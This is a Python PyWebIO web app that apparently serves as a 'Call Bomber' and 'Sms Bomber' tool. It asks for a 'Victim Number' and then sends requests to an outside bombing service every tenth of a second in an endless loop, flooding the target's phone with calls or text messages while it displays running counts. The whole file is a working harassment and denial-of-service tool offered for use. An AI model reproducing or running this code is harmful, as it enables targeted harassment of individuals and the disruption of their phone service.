import pywebio.output as output
import pywebio.input as input
import requests
import time

count = {}

def scroll():
    output.put_html('<script>window.scrollTo(0, document.body.scrollHeight);</script>')

def MyApp():
    output.put_html('<center><h1 style="color:#FFD700; text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700, 0 0 30px #FFD700, 0 0 40px #FFD700, 0 0 50px #FFD700; -webkit-text-stroke: 1px black;">Welcome To The <span style="color:brown; -webkit-text-stroke: 1px black;">Sanchit</span> Bomber Website !</h1></center>').style('color:brown; font-weight:bold')

    mm = input.input_group('This Are Our Collection', [
        input.radio('Choose What You Want:', options=['Call Bomber', 'Sms Bomber'], name='meth')
    ])

    method = mm['meth']

    if method == 'Call Bomber':
        skc = input.input_group('• Call Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="SK")])
        SK = str(skc["SK"])
        if SK not in count:
            count[SK] = {"successful": 0, "failed": 0}
        else:
            count[SK]["successful"] = 0
            count[SK]["failed"] = 0
        while True:
            req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
            if 'started' in req:
                count[SK]["successful"] += 1
                output.put_html(f'<h3 style="color:#4CAF50; text-shadow: 0 0 10px #4CAF50, 0 0 20px #4CAF50, 0 0 30px #4CAF50, 0 0 40px #4CAF50, 0 0 50px #4CAF50; -webkit-text-stroke: 1px black;">✅ Call Bombing On - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[SK]["successful"]}</span></h3><i style="color:#FFC107; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#FF5722;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[SK]["failed"] += 1
                output.put_html(f'<h3 style="color:#FF5722; text-shadow: 0 0 10px #FF5722, 0 0 20px #FF5722, 0 0 30px #FF5722, 0 0 40px #FF5722, 0 0 50px #FF5722; -webkit-text-stroke: 1px black;">❌ Call Bombing Off - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[SK]["failed"]}</span></h3><i style="color:#FFC107; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#FF5722;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)

    elif method == 'Sms Bomber':
        skc = input.input_group('• Sms Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="JK")])
        JK = str(skc["JK"])
        if JK not in count:
            count[JK] = {"successful": 0, "failed": 0}
        else:
            count[JK]["successful"] = 0
            count[JK]["failed"] = 0
        while True:
            req = requests.get(f"https://bomber-tools.xyz/sms/?mobile={JK}&accesskey=BomberSmm&submit=Submit").text
            if 'started' in req:
                count[JK]["successful"] += 1
                output.put_html(f'<h3 style="color:#4CAF50; text-shadow: 0 0 10px #4CAF50, 0 0 20px #4CAF50, 0 0 30px #4CAF50, 0 0 40px #4CAF50, 0 0 50px #4CAF50; -webkit-text-stroke: 1px black;">✅ Sms Bombing On - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[JK]["successful"]}</span></h3><i style="color:#FFC107; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#FF5722;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[JK]["failed"] += 1
                output.put_html(f'<h3 style="color:#FF5722; text-shadow: 0 0 10px #FF5722, 0 0 20px #FF5722, 0 0 30px #FF5722, 0 0 40px #FF5722, 0 0 50px #FF5722; -webkit-text-stroke: 1px black;">❌ Sms Bombing Off - <span style="color:#2196F3;">Count =></span> <span style="color:#FF5722;">{count[JK]["failed"]}</span></h3><i style="color:#FFC107; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#FF5722;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)

if __name__ == '__main__':
    from pywebio import start_server
    start_server(MyApp, port=8086, debug=True)
